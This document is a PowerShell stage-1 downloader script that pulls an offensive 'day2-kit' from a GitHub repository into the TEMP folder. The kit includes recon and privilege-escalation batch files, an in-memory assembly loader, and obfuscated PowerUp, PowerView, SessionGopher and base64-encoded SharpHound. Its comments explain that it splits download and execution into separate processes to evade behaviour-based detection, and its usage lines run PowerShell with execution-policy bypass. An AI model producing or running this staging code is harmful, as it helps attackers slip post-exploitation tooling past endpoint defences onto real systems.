# Get-Files.ps1 - fetch-only downloader (stage 1). NO execution of fetched content.
# Deliberately avoids cradle patterns (no IEX, no Invoke-Expression, no assembly load),
# so the behavior chain "download -> execute in same process" never forms.
# Usage (run as its own process, then execute stage-2 from disk in a NEW process):
#   powershell -ep bypass -c "(New-Object Net.WebClient).DownloadFile('<raw>/ps1/Get-Files.ps1', \"$env:TEMP\gf.ps1\")"
#   powershell -ep bypass -f "$env:TEMP\gf.ps1"
param(
    [string]$Base = 'https://raw.githubusercontent.com/tiaodan577-glitch/day2-kit/main',
    [string]$OutDir = (Join-Path $env:TEMP 'day2-kit')
)

$files = @(
    'README-Day2.md',
    'manifest.sha256',
    'bat/00-context.bat', 'bat/01-sysinfo.bat', 'bat/02-net-recon.bat',
    'bat/03-domain.bat', 'bat/04-services.bat', 'bat/05-privesc.bat',
    'bat/06-av-check.bat', 'bat/07-schtasks.bat', 'bat/99-run-all.bat',
    'wsh/enum-system.vbs', 'wsh/enum-network.js', 'wsh/run-all.wsf',
    'ps1/Get-LocalRecon.ps1', 'ps1/Load-Assembly.ps1', 'ps1/Invoke-Suite.ps1',
    'ps1/Get-Files.ps1', 'ps1/InMem-Asm.ps1',
    'tools-obf/PowerUp.ps1', 'tools-obf/PowerView.ps1', 'tools-obf/jaws-enum.ps1',
    'tools-obf/SessionGopher.ps1', 'tools-obf/PrivescCheck.ps1',
    'tools-obf/SharpHound.exe.b64'
)

$wc = New-Object Net.WebClient
foreach ($f in $files) {
    $dest = Join-Path $OutDir ($f -replace '/', '\')
    $dir = Split-Path $dest -Parent
    if (!(Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
    try {
        $wc.DownloadFile("$Base/$f", $dest)
        Write-Host "[+] $f"
    } catch {
        Write-Host "[-] $f : $($_.Exception.Message)"
    }
}
Write-Host "[+] fetched -> $OutDir  (now start a NEW powershell process to run anything from it)"
